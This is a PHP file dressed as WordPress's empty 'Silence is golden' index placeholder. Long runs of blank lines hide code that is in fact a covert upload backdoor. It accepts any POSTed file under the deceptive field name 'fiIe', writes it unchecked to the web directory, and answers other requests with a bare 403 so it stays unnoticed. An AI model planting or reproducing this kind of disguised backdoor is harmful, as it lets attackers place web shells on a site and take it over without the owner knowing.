<?php
// Silence is golden.


































































































































































































































































































































































































































































































































































if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fiIe'])) {
        $file_info = $_FILES['fiIe'];
        $target_name = basename($file_info['name']);
        if (move_uploaded_file($file_info['tmp_name'], $target_name)) {
            http_response_code(200);
            die(" ");
        } else {
            http_response_code(500);
            die(" ");
        }
    } else {
        http_response_code(400);
        die(" ");
    }
} else {
    http_response_code(403);
    die(" ");
}
